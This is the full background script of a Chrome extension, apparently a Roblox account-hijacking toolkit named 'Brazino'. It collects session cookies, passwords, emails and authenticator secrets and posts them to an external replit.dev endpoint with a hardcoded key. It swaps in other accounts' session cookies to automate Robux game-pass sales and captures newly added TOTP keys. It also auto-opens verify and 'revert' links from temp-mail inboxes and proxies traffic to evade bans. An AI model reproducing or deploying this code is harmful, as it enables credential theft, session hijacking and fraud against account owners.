// ─── Brazino v5.1 Background Service Worker ───

// ══════════════════════════════════════════════════════════════
//  BRAZINO VAULT — Sync com o site
// ══════════════════════════════════════════════════════════════
const VAULT_API_URL = 'https://16e2259d-8435-43e3-8614-2005ecb7c929-00-1rpux82y99s6w.picard.replit.dev/api/accounts';
const VAULT_API_KEY = 'muluck';

async function syncAccountToVault(account) {
  if (!account?.username) return;
  try {
    const map = ((await chrome.storage.local.get(['brazinoVaultMap'])).brazinoVaultMap) || {};
    const websiteId = map[String(account.userId)];

    const payload = {
      username: account.username,
      ...(account.password   ? { password:      account.password   } : {}),
      ...(account.email      ? { email:          account.email      } : {}),
      ...(account.authKey    ? { authenticator:  account.authKey    } : {}),
      ...(account.avatarUrl  ? { avatarUrl:      account.avatarUrl  } : {}),
    };

    let res;
    if (websiteId) {
      res = await fetch(`${VAULT_API_URL}/${websiteId}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': VAULT_API_KEY },
        body: JSON.stringify(payload),
      });
    } else {
      res = await fetch(VAULT_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-API-Key': VAULT_API_KEY },
        body: JSON.stringify(payload),
      });
    }

    if (res.ok) {
      const data = await res.json();
      if (data.id && !websiteId) {
        map[String(account.userId)] = data.id;
        await chrome.storage.local.set({ brazinoVaultMap: map });
      }
    }
  } catch { /* falha silenciosa — não interrompe a extensão */ }
}


// Garante que o alarme do refresher exista sempre — ao instalar E ao reiniciar o SW
function ensureCookieRefresherAlarm() {
  chrome.alarms.get('brazinoCookieRefresher', (alarm) => {
    if (!alarm) chrome.alarms.create('brazinoCookieRefresher', { periodInMinutes: 15 });
  });
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ proxyEnabled: false, proxyConfig: null });
  ensureCookieRefresherAlarm();
});

// Recria o alarme quando o service worker é reativado após ficar inativo
chrome.runtime.onStartup.addListener(() => {
  ensureCookieRefresherAlarm();
});

// Também ao receber qualquer mensagem (wake-up do SW), verifica o alarme
// (cobre casos onde SW acordou via extensão sem passar por onStartup)
(function selfHealAlarm() {
  ensureCookieRefresherAlarm();
})();

// ══════════════════════════════════════════════════════════════
//  ALARMES
// ══════════════════════════════════════════════════════════════
chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === 'brazinoGlobalInbox') {
    await checkGlobalInbox();
  } else if (alarm.name.startsWith('brazinoAccInbox_')) {
    await checkAccountInbox(alarm.name.slice('brazinoAccInbox_'.length));
  } else if (alarm.name === 'brazinoCookieRefresher') {
    await refreshRobloxCookie();
  }
});

// ══════════════════════════════════════════════════════════════
//  COOKIE REFRESHER AUTOMÁTICO
// ══════════════════════════════════════════════════════════════

/**
 * Lê o cookie atual, faz uma requisição autenticada ao Roblox,
 * e verifica se o cookie foi atualizado após a requisição.
 * Se sim, salva e notifica o usuário.
 */
async function refreshRobloxCookie() {
  try {
    // Pega o cookie antes da requisição
    const cookieBefore = await chrome.cookies.get({
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY'
    });

    if (!cookieBefore) {
      await chrome.storage.local.set({ lastCookieRefreshStatus: 'not_logged_in', lastCookieRefreshTime: Date.now() });
      return { success: false, reason: 'Nenhum cookie encontrado. Faça login primeiro.' };
    }

    // Faz requisição autenticada — isso pode fazer o Roblox rotacionar o cookie
    const delay = Math.floor(Math.random() * 3000) + 1000; // delay random 1-4s (anti-ban)
    await new Promise(r => setTimeout(r, delay));

    // Injeta o cookie manualmente — service worker não envia credentials automaticamente
    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
      cache: 'no-store',
      headers: {
        'Accept': 'application/json',
        'Cookie': `.ROBLOSECURITY=${cookieBefore.value}`,
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
      }
    });

    if (!response.ok) {
      await chrome.storage.local.set({ lastCookieRefreshStatus: 'auth_failed', lastCookieRefreshTime: Date.now() });
      return { success: false, reason: 'Não autenticado. Cookie pode estar expirado.' };
    }

    // Pega o cookie depois da requisição
    const cookieAfter = await chrome.cookies.get({
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY'
    });

    if (!cookieAfter) {
      await chrome.storage.local.set({ lastCookieRefreshStatus: 'cookie_lost', lastCookieRefreshTime: Date.now() });
      return { success: false, reason: 'Cookie desapareceu após requisição.' };
    }

    const cookieChanged = cookieBefore.value !== cookieAfter.value;
    const newCookieValue = cookieAfter.value;

    await chrome.storage.local.set({
      lastCookieRefreshStatus: cookieChanged ? 'updated' : 'unchanged',
      lastCookieRefreshTime: Date.now(),
      lastSavedCookie: newCookieValue
    });

    // Atualiza cookie na conta logada se existir
    if (cookieChanged) {
      const userData = await response.json().catch(() => null);
      if (userData?.id) {
        const st = await chrome.storage.local.get(['brazinoAccounts']);
        const accs = st.brazinoAccounts || [];
        const idx = accs.findIndex(a => String(a.userId) === String(userData.id));
        if (idx >= 0) {
          accs[idx] = { ...accs[idx], cookie: newCookieValue, updatedAt: Date.now() };
          await chrome.storage.local.set({ brazinoAccounts: accs });
        }
      }

      // Notifica com os últimos 24 caracteres do cookie
      const preview = '...' + newCookieValue.slice(-24);
      chrome.notifications.create('cookieRefresh_' + Date.now(), {
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: 'Brazino — Cookie Atualizado!',
        message: `Novo cookie: ${preview}`,
        priority: 1
      });
    }

    return { success: true, changed: cookieChanged, cookie: newCookieValue };
  } catch (e) {
    await chrome.storage.local.set({ lastCookieRefreshStatus: 'error', lastCookieRefreshTime: Date.now() });
    return { success: false, reason: e.message };
  }
}

// ══════════════════════════════════════════════════════════════
//  EMAIL INBOX MONITORING
// ══════════════════════════════════════════════════════════════
async function checkGlobalInbox() {
  const data = await chrome.storage.local.get(['tempToken', 'tempLastMsgId', 'tempVerifyDone']);
  if (!data.tempToken) { chrome.alarms.clear('brazinoGlobalInbox'); return; }
  try {
    const msgs = (await fetch('https://api.mail.tm/messages', {
      headers: { 'Authorization': `Bearer ${data.tempToken}` }
    }).then(r => r.json()))['hydra:member'];
    if (!msgs?.length) return;
    if (msgs[0].id === data.tempLastMsgId) return;

    const md = await fetch(`https://api.mail.tm/messages/${msgs[0].id}`, {
      headers: { 'Authorization': `Bearer ${data.tempToken}` }
    }).then(r => r.json());
    const txt  = md.text || '';
    const full = txt + (md.html ? md.html.join('') : '');
    const vm   = full.match(/https?:\/\/(www\.)?roblox\.com\/[^\s"'>]+verify[^\s"'>]*/i);
    const rm   = full.match(/https?:\/\/(www\.)?roblox\.com\/[^\s"'>]+revert[^\s"'>]*/i);
    const cm   = txt.match(/\b\d{6}\b/);

    if (vm && !data.tempVerifyDone) {
      const link  = vm[0].replace(/&amp;/g, '&');
      const notif = { type: 'verify', content: 'Clique para verificar a conta Roblox', link };
      await chrome.storage.local.set({ lastNotif: notif, tempLastMsgId: msgs[0].id, tempVerifyDone: true });
      const st = await chrome.storage.local.get(['lastLoggedUserId', 'email', 'brazinoAccounts']);
      if (st.lastLoggedUserId && st.email) {
        const accs = st.brazinoAccounts || [];
        const idx  = accs.findIndex(a => String(a.userId) === String(st.lastLoggedUserId));
        if (idx >= 0) {
          accs[idx] = { ...accs[idx], email: st.email, updatedAt: Date.now() };
          await chrome.storage.local.set({ brazinoAccounts: accs });
        }
      }
      chrome.tabs.create({ url: link });
    } else if (rm) {
      const link  = rm[0].replace(/&amp;/g, '&');
      const notif = { type: 'revert', content: 'Clique para reverter alterações', link };
      await chrome.storage.local.set({ lastNotif: notif, tempLastMsgId: msgs[0].id });
    } else if (cm) {
      const code  = cm[0];
      const notif = { type: 'code', content: `Código recebido: ${code}`, link: null };
      await chrome.storage.local.set({ lastNotif: notif, lastTempCode: code, lastTempCodeTime: Date.now(), tempLastMsgId: msgs[0].id });
      chrome.tabs.query({ url: '*://*.roblox.com/*' }, (tabs) => {
        tabs.forEach(t => chrome.tabs.sendMessage(t.id, { action: 'codeCaptured', code }).catch(() => {}));
      });
    }
  } catch { /* falha silenciosa */ }
}

async function checkAccountInbox(uid) {
  const data      = await chrome.storage.local.get(['brazinoAccounts']);
  const accs      = data.brazinoAccounts || [];
  const acc       = accs.find(a => String(a.userId) === uid);
  const alarmName = `brazinoAccInbox_${uid}`;

  if (!acc?.tempToken) { chrome.alarms.clear(alarmName); return; }

  try {
    const msgs = (await fetch('https://api.mail.tm/messages', {
      headers: { 'Authorization': `Bearer ${acc.tempToken}` }
    }).then(r => r.json()))['hydra:member'];
    if (!msgs?.length) return;
    if (msgs[0].id === acc.tempLastMsgId) return;

    const md = await fetch(`https://api.mail.tm/messages/${msgs[0].id}`, {
      headers: { 'Authorization': `Bearer ${acc.tempToken}` }
    }).then(r => r.json());
    const txt  = md.text || '';
    const full = txt + (md.html ? md.html.join('') : '');
    const vm   = full.match(/https?:\/\/(www\.)?roblox\.com\/[^\s"'>]+verify[^\s"'>]*/i);
    const rm   = full.match(/https?:\/\/(www\.)?roblox\.com\/[^\s"'>]+revert[^\s"'>]*/i);
    const cm   = txt.match(/\b\d{6}\b/);
    const idx  = accs.findIndex(a => String(a.userId) === uid);
    if (idx < 0) return;

    if (vm && !acc.tempVerifyDone) {
      const link  = vm[0].replace(/&amp;/g, '&');
      const notif = { type: 'verify', content: 'Clique para verificar conta Roblox', link };
      if (acc.tempEmail) accs[idx].email = acc.tempEmail;
      accs[idx].tempLastNotif  = notif;
      accs[idx].tempLastMsgId  = msgs[0].id;
      accs[idx].tempVerifyDone = true;
      accs[idx].updatedAt      = Date.now();
      await chrome.storage.local.set({ brazinoAccounts: accs });
      chrome.tabs.create({ url: link });
    } else if (rm) {
      const link  = rm[0].replace(/&amp;/g, '&');
      const notif = { type: 'revert', content: 'Clique para reverter alterações', link };
      accs[idx].tempLastNotif = notif;
      accs[idx].tempLastMsgId = msgs[0].id;
      accs[idx].updatedAt     = Date.now();
      await chrome.storage.local.set({ brazinoAccounts: accs });
      chrome.tabs.create({ url: link });
    } else if (cm) {
      const code  = cm[0];
      const notif = { type: 'code', content: `Código: ${code}` };
      accs[idx].tempLastNotif = notif;
      accs[idx].tempLastMsgId = msgs[0].id;
      accs[idx].updatedAt     = Date.now();
      await chrome.storage.local.set({ brazinoAccounts: accs });
      await chrome.storage.local.set({ lastTempCode: code, lastTempCodeTime: Date.now() });
      chrome.tabs.query({ url: '*://*.roblox.com/*' }, (tabs) => {
        tabs.forEach(t => chrome.tabs.sendMessage(t.id, { action: 'codeCaptured', code }).catch(() => {}));
      });
    }
  } catch { /* falha silenciosa */ }
}

// ══════════════════════════════════════════════════════════════
//  MESSAGE LISTENER
// ══════════════════════════════════════════════════════════════
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

  // ── Robux ──
  if (request.action === 'closeTab') {
    if (sender.tab?.id) setTimeout(() => chrome.tabs.remove(sender.tab.id), 2000);
  }

  if (request.action === 'updateGamePass') {
    startRobuxAutomation(request.data)
      .then(() => sendResponse({ success: true }))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'automationFinished') finishRobuxAutomation(request.passId);

  if (request.action === 'passwordChanged') {
    chrome.storage.local.get(['newPassword'], (data) => {
      if (data.newPassword) chrome.storage.local.set({ currentPassword: data.newPassword, newPassword: '' });
    });
  }

  // ── Cookie Refresher manual ──
  if (request.action === 'refreshCookieNow') {
    refreshRobloxCookie()
      .then(result => sendResponse(result))
      .catch(e => sendResponse({ success: false, reason: e.message }));
    return true;
  }

  // ── Verificar IP público ──
  if (request.action === 'checkPublicIp') {
    checkPublicIp()
      .then(ip => sendResponse({ ip }))
      .catch(() => sendResponse({ ip: null }));
    return true;
  }

  // ── VPN ──
  if (request.action === 'setProxy') {
    applyProxy(request.config)
      .then(() => sendResponse({ success: true }))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'clearProxy') {
    clearProxy()
      .then(() => sendResponse({ success: true }))
      .catch(e => sendResponse({ success: false, error: e.message }));
    return true;
  }

  if (request.action === 'getProxyStatus') {
    chrome.storage.local.get(['proxyEnabled', 'proxyConfig'], data => sendResponse(data));
    return true;
  }

  // ── Ping do content.js ──
  if (request.action === 'pingInboxCheck') {
    checkGlobalInbox().catch(() => {});
    chrome.storage.local.get(['brazinoAccounts'], (data) => {
      (data.brazinoAccounts || []).forEach(acc => {
        if (acc.tempToken) checkAccountInbox(String(acc.userId)).catch(() => {});
      });
    });
    sendResponse({ ok: true }); return true;
  }

  // ── Monitoramento inbox ──
  if (request.action === 'bgStartGlobalMonitor') {
    chrome.alarms.clear('brazinoGlobalInbox', () => {
      chrome.alarms.create('brazinoGlobalInbox', { periodInMinutes: 1 });
    });
    sendResponse({ ok: true }); return true;
  }

  if (request.action === 'bgStartAccMonitor') {
    const name = `brazinoAccInbox_${request.uid}`;
    chrome.alarms.clear(name, () => {
      chrome.alarms.create(name, { periodInMinutes: 1 });
    });
    sendResponse({ ok: true }); return true;
  }

  // ── Autenticador: remoção detectada ──

  // ── Sync com Brazino Vault (site) ──
  if (request.action === 'syncVault') {
    syncAccountToVault(request.account).catch(() => {});
    sendResponse({ ok: true }); return true;
  }

  if (request.action === 'authKeyRemoved') {
    chrome.storage.local.get(['brazinoAlerts', 'brazinoAccounts', 'lastLoggedUserId'], (data) => {
      const alerts   = data.brazinoAlerts || [];
      const accounts = data.brazinoAccounts || [];
      const uid      = request.userId || data.lastLoggedUserId;
      if (!uid) return;
      const account = accounts.find(a => String(a.userId) === String(uid));
      if (!account) return;
      const idx = accounts.findIndex(a => String(a.userId) === String(uid));
      if (idx >= 0) accounts[idx] = { ...accounts[idx], authKey: '' };
      alerts.push({ type: 'authRemoved', userId: uid, username: account.username, timestamp: Date.now() });
      chrome.storage.local.set({ brazinoAccounts: accounts, brazinoAlerts: alerts });
    });
  }

  // ── Autenticador: nova chave detectada ──
  if (request.action === 'newAuthKeyDetected') {
    function isRealTotpSecret(s) {
      const c = (s || '').replace(/\s/g,'').toUpperCase();
      if (![16,24,32].includes(c.length)) return false;
      if (!/^[A-Z2-7]+$/.test(c)) return false;
      const d = (c.match(/[2-7]/g)||[]).length;
      return d >= 2 && d / c.length >= 0.10;
    }
    if (!isRealTotpSecret(request.secret)) return;

    chrome.storage.local.get(['brazinoAlerts', 'brazinoAccounts', 'lastLoggedUserId'], (data) => {
      const alerts   = data.brazinoAlerts || [];
      const accounts = data.brazinoAccounts || [];
      const uid      = request.userId || data.lastLoggedUserId;
      const account  = uid ? accounts.find(a => String(a.userId) === String(uid)) : null;
      if (!uid || !account) return;
      const recent = alerts.find(a => a.type === 'newAuthKey' && a.userId === uid && a.secret === request.secret
        && (Date.now() - a.timestamp < 60000));
      if (recent) return;
      alerts.push({ type: 'newAuthKey', userId: uid, username: account.username, secret: request.secret, timestamp: Date.now() });
      chrome.storage.local.set({ brazinoAlerts: alerts });
    });
  }
});

// ══════════════════════════════════════════════════════════════
//  ROBUX AUTOMATION
// ══════════════════════════════════════════════════════════════
async function getRobloxCookie() {
  return chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' });
}
async function setRobloxCookie(value) {
  if (!value) return;
  await chrome.cookies.set({
    url: 'https://www.roblox.com', domain: '.roblox.com', name: '.ROBLOSECURITY',
    value: value.replace('.ROBLOSECURITY=', '').trim(),
    path: '/', secure: true, httpOnly: true, sameSite: 'no_restriction'
  });
}
async function startRobuxAutomation(data) {
  const { cookie, value, gameId, passId } = data;
  const currentCookie = await getRobloxCookie();
  await chrome.storage.local.set({ originalCookie: currentCookie?.value || null, automationInProgress: true, targetPassId: passId, targetPrice: value });
  await setRobloxCookie(cookie);
  chrome.tabs.create({ url: `https://create.roblox.com/dashboard/creations/experiences/${gameId}/passes/${passId}/sales`, active: true });
}
async function finishRobuxAutomation(passId) {
  const data = await chrome.storage.local.get(['originalCookie']);
  if (data.originalCookie) await setRobloxCookie(data.originalCookie);
  await chrome.storage.local.remove(['originalCookie', 'automationInProgress', 'targetPassId', 'targetPrice']);
  const passLink = `https://www.roblox.com/game-pass/${passId}`;
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs[0]) chrome.tabs.update(tabs[0].id, { url: passLink });
    else chrome.tabs.create({ url: passLink });
  });
}

// ══════════════════════════════════════════════════════════════
//  IP PÚBLICO
// ══════════════════════════════════════════════════════════════
async function checkPublicIp() {
  const apis = [
    { url: 'https://api.ipify.org?format=json',   json: true,  key: 'ip' },
    { url: 'https://api4.my-ip.io/v2/ip.json',    json: true,  key: 'ip' },
    { url: 'https://checkip.amazonaws.com/',       json: false },
    { url: 'https://ipv4.icanhazip.com/',          json: false },
    { url: 'https://api64.ipify.org?format=json',  json: true,  key: 'ip' },
    { url: 'https://ip4.seeip.org/json',           json: true,  key: 'ip' },
    { url: 'https://freeipapi.com/api/json',       json: true,  key: 'ipAddress' },
  ];
  for (const api of apis) {
    try {
      const ctrl = new AbortController();
      const tid  = setTimeout(() => ctrl.abort(), 6000);
      const res  = await fetch(api.url, { cache: 'no-store', signal: ctrl.signal });
      clearTimeout(tid);
      const val  = api.json ? await res.json() : await res.text();
      const ip   = api.json ? val[api.key] : val.trim();
      if (ip && /^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) return ip;
    } catch { /* tenta próxima */ }
  }
  throw new Error('Todas as APIs de IP falharam');
}

// ══════════════════════════════════════════════════════════════
//  PROXY / VPN
// ══════════════════════════════════════════════════════════════
async function applyProxy(config) {
  return new Promise((resolve, reject) => {
    const isSocks  = config.type === 'socks4' || config.type === 'socks5';
    const scheme   = isSocks
      ? (config.type === 'socks5' ? 'SOCKS5' : 'SOCKS4')
      : (config.type === 'https'  ? 'HTTPS'  : 'PROXY');

    const directDomains = [
      'api.ipify.org', 'api64.ipify.org',
      'checkip.amazonaws.com', 'ipv4.icanhazip.com',
      'api4.my-ip.io', 'freeipapi.com', 'ip4.seeip.org',
      'api.mail.tm',
      'proxylist.geonode.com', 'api.proxyscrape.com', 'www.proxy-list.download',
    ];

    const directCheck = directDomains
      .map(d => `dnsDomainIs(host,"${d}")||host==="${d}"`)
      .join('||');

    const pacScript = `
      function FindProxyForURL(url, host) {
        if (isPlainHostName(host)||host==="localhost"||host==="127.0.0.1"||${directCheck}) {
          return "DIRECT";
        }
        return "${scheme} ${config.host}:${config.port}";
      }
    `;

    chrome.proxy.settings.set({
      value: { mode: 'pac_script', pacScript: { data: pacScript } },
      scope: 'regular'
    }, () => {
      if (chrome.runtime.lastError) { reject(new Error(chrome.runtime.lastError.message)); return; }
      chrome.storage.local.set({ proxyEnabled: true, proxyConfig: config });
      chrome.action.setBadgeText({ text: 'VPN' });
      chrome.action.setBadgeBackgroundColor({ color: '#10b981' });
      resolve();
    });
  });
}
async function clearProxy() {
  return new Promise((resolve, reject) => {
    chrome.proxy.settings.clear({ scope: 'regular' }, () => {
      if (chrome.runtime.lastError) { reject(new Error(chrome.runtime.lastError.message)); return; }
      chrome.storage.local.set({ proxyEnabled: false });
      chrome.action.setBadgeText({ text: '' });
      resolve();
    });
  });
}
